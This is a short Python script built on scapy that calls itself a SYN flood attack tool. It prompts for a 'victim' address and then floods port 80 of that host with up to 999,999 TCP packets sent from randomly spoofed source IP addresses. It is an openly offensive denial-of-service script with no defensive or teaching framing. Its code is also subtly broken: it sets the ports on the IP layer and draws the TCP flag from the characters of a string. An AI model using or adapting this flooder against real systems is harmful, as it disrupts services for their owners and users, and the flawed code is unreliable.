from scapy.all import *
import random

random_flag = ['S', 'ACK', 'PSH', 'FIN', 'RST']
class vic_dev():
    def __init__(self, ip_addr):
        self.ip_addr = ip_addr
        
def interface():
    print("<< SYN FLood attack >>")
    print("<i> Flooding website <i>")
    print("<GITHUB> iFanID <GITHUB>")

def input_all():
    print("<i> Enter victim addres! <i>")
    victim = vic_dev(input(">> "))
    return victim

def Flooding(victim):
    port = 80
    for x in range(0, 999999):
        packetIP = IP()
        packetIP.src = '%i.%i.%i.%i' % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
        packetIP.dst = victim.ip_addr
        packetTCP = TCP()
        packetIP.sport = RandShort()
        packetIP.dport = port
        packetTCP.flags = random.choice(str(random_flag))
        
        raw = Raw(b"N"*1024)
        packet = packetIP/packetTCP/raw
        
        send(packet, verbose=0)
        print("Flooding {0}".format(str(x)))
        
def main():
    interface()
    victim = input_all()
    print("Attacking {0}.....".format(victim.ip_addr))
    Flooding(victim)
    
if __name__ == '__main__':
    main()    
